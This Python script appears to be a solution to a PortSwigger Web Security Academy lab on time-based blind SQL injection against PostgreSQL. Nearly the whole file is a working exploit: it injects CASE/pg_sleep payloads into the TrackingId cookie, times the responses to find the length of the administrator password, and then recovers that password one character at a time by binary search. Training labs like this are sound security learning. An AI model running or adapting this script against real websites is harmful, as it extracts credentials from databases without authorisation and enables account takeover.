# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
# PostgreSQL server without user-facing error reporting but with synchronous processing and insufficient input sanitation
# Use time delays to deduce 'administrator' user's password

import requests

# Populate environment avariables before running
URL = ""
SESSION = ""
TRACKING_ID = ""
CHAR_SPACE = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']


def get_pwd_length(cookies):
    # time delay on negative to save time during brute-force
    guess_len = 1
    cookies["TrackingId"] = TRACKING_ID + "\' || (SELECT CASE WHEN LENGTH(password)>" + str(guess_len) + "THEN \'\' ELSE pg_sleep(10) END FROM users WHERE username = \'administrator\')--"
    res = requests.get(URL, cookies=cookies)
    res_t = res.elapsed.total_seconds()
    
    while res_t < 10:
        guess_len += 1
        cookies["TrackingId"] = TRACKING_ID + "\' || (SELECT CASE WHEN LENGTH(password)>" + str(guess_len) + "THEN \'\' ELSE pg_sleep(10) END FROM users WHERE username = \'administrator\')--"
        res = requests.get(URL, cookies=cookies)
        res_t = res.elapsed.total_seconds()
    
    print("Password length: ", guess_len)
    return guess_len


def cursor_check(cookies, pswd_i, target):
    # time delay on positive to save time during brute-force
    cookies["TrackingId"] = TRACKING_ID + "\' || (SELECT CASE WHEN SUBSTR(password, " + pswd_i + ", 1)=\'" + target + "\' THEN pg_sleep(10) ELSE \'\' END FROM users WHERE username=\'administrator\')--"
    res = requests.get(URL, cookies=cookies)
    return res.elapsed.total_seconds() >= 3


def right_check(cookies, pswd_i, target):
    cookies["TrackingId"] = TRACKING_ID + "\' || (SELECT CASE WHEN SUBSTR(password, " + pswd_i + ", 1)>\'" + target + "\' THEN pg_sleep(10) ELSE \'\' END FROM users WHERE username=\'administrator\')--"
    res = requests.get(URL, cookies=cookies)
    return res.elapsed.total_seconds() >= 3


# determines password character at one position
# returns CHAR_SPACE index
def recursiveBinarySearch(l, r, cookies, pswd_i):
    if r >= l:
        mid = l + (r - l + 1) // 2
        if cursor_check(cookies, str(pswd_i), CHAR_SPACE[mid]):
            return mid
        elif right_check(cookies, str(pswd_i), CHAR_SPACE[mid]):
            return recursiveBinarySearch(mid + 1, r, cookies, str(pswd_i))
        else:
            return recursiveBinarySearch(l, mid - 1, cookies, str(pswd_i))
    else:
        return -1


def main():
    # true: test condition NOT met
    # error: test condition met
    print("determining password length...")
    cookies = dict(session=SESSION, TrackingId="")
    pwd_length = get_pwd_length(cookies)
    
    cursor = 1
    admin_pwd = ""
    while cursor <= pwd_length:
        print("Determing password character", cursor, "...")
        cookies["TrackingId"] = ""
        pwd_char_ind = recursiveBinarySearch(0, 35, cookies, cursor)
        try:
            print("Password character", cursor, ": ", CHAR_SPACE[pwd_char_ind], "\n")
        except IndexError:
            print("Index error on CHAR_SPACE\nBreaking...", "\n")
            break
        admin_pwd += CHAR_SPACE[pwd_char_ind]
        cursor += 1
    print("Password: ", admin_pwd)


main()
